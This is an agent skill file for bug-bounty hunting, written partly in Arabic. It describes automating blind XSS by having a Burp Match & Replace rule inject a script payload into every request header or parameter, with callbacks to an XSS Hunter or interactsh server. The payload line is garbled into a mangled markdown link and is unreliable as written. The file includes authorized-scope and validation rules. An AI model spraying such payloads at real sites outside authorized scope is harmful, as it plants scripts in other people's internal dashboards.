# SKILL: Blind XSS أوتوماتيكي عبر Match & Replace في Burp

**Skill id:** `tip/blind-xss-أوتوماتيكي-عبر-match-replace-في-burp`  
**Category:** XSS  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e880817d8810f5e8432c5d61  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **XSS**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

بدل ما تدور يدوي على أماكن الحقن المحتملة، اعمل match & replace rule في الـ proxy (Burp) يحقن الـ Blind XSS payload بتاعك أوتوماتيكيًا في كل ريكووست بتبعته وانت بتتصفح عادي. لو الـ payload اتنفذ في admin panel أو dashboard داخلي، هتوصلك إشعار على سيرفر الـ XSS Hunter/interactsh بتاعك.

## Payload / Code

```
في Burp: Proxy > Match and Replace
Match: rn (أي header)
Replace: rn\: ">\\rn](https://YOUR-XSS-HUNTER-URL%3E%3C/script%3Ern)

أو أضف الـ payload في كل قيمة param بتمر عليها أثناء التصفح العادي
```

## Source

Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 1)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
